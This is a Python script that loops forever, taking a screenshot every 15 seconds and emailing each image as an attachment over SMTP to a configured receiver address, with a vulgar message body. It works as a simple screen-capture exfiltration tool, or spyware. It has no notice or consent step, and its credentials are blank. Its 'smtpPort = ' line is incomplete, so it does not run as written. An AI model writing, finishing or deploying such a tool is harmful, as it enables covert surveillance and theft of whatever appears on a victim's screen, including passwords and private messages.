import pyautogui
import time
import os 
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders



smtpURL = ""
smtpPort = 
sender_email = ""
receiver_email = ""
password = ""




def sendEmail(sender, receiver, password, subject, messageBody, filename, smtpURL, smtpPort):
   
    message = MIMEMultipart()
    message["From"] = sender
    message["To"] = receiver
    message["Subject"] = subject

    message.attach(MIMEText(messageBody, "plain"))

    # Open the file in binary mode
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send via email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()


    # Create a secure SSL context
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP_SSL(smtpURL, smtpPort, context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    except Exception as e:   
        print(e)
    finally:
        server.quit()


def main():
    print("---")

    if not os.path.isdir('tmp'):
        os.mkdir("tmp")
        print("tmp directory created")

    screenshotNumber = 1
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"tmp/{screenshotNumber}.png")
        print(f"screen captured {screenshotNumber}")
        
        subject = f"Screenshot {screenshotNumber}"
        messageBody = f"chuj."
        sendEmail(sender_email, receiver_email, password, subject, messageBody, f"tmp/{screenshotNumber}.png", smtpURL, smtpPort)

        screenshotNumber+=1
        time.sleep(15)

main()